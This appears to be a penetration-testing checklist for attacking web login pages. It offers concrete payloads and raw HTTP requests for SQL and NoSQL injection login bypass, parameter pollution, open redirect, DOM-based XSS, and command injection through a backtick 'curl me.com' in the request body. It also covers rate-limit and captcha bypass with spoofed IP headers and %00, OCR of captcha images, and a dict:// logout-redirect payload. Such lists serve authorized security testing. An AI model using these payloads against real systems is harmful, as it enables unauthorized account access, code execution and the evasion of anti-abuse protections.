- Try SQL Injection
- Try NoSQL Injection
- Try To Insert &gt In Password Parameter AND change Content Type Header To application/json To Bypass Log In
- Try To add nameOfparameter[ ] In Email OR Password Parameter To OverWrite Value Of The Parameter
- Try To Insert `_all_docs` OR `user[ ]=_all_docs` In User Parameter With Undefined Password To Bypass Log In
- If The Body Of Request Is Json , Try To Log In By Using Multiple Usernames At The Same Time To Cause Error
- Try To Bypass Log In By Inserting e.g. \ OR ||1# As Email AND Password
- If There Is Next URL Parameter Try To Insert http:3627732462 OR https://www.google.com%ff@www.company.com To Redirect User To Google
- If There Is Next URL Parameter Try To Insert lol ';alert(document.domain)//lol To Get DOM-based XSS
- Try To Insert Curl As Part Of The Login To Get RCE

```
POST /logIn HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Referer: https://previous.com/path
Origin: https://www.company.com
Content-Length: Number

email=me&password=**************&`curl me.com`
```

- Try To Insert X-Forwarded-For Header One Time OR Two Times To Bypass Rate Limits
- Try To Do Brute Force On Password Parameter AND If There Is Too Many Requests, Insert %00 In The Username OR Email Parameter To Bypass Rate Limits
- Try To Send The Additional properties In The Request To Gain Extra Authorities OR Get More Functionalities like add `admin=true`
- Try To Change HTTP Request Method To GET Instead Of POST To Bypass Captcha
- Try To Remove Captcha Parameter To Bypass Captcha
- Try To Reuse The Old-Captcha To Bypass Captcha
- Try To Change JSON Body To Normal Body AND Content Type Header From application/json To  application/x-www-form-urlencoded To Bypass Captcha
- Try To Use Noun-Standard Headers e.g. X-Originating-IP , X-Client-IP, X-Remote-IP AND X-Remote-Addr To Bypass Captcha

```http
POST /logIn? HTTP/1.1
Host: www.company.com
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Content-Length: Number

user=me&password=****&captcha=Random
```

- If The Company Uses Captcha Image Contains Text Try To Use Convert Command AND Tesseract Tool To Extract The Text From The Image

```bash
# Steps to produce :-  
# Download The Image , Called e.g. img.png
convert img.png -colorspace gray  
                -threshold 50% imgOUT.png
tesseract imgOUT.png
```

- Try To Figure Out If The Session Will Expire After Logging Out OR Not
- Try To Log Out , And Insert dict://me.com:80 If There Is Parameter To Redirect After Log Out e.g. logout_path

```http
GET /logout?logout_path=dict://me.com:80 HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Origin: https://www.company.com
```



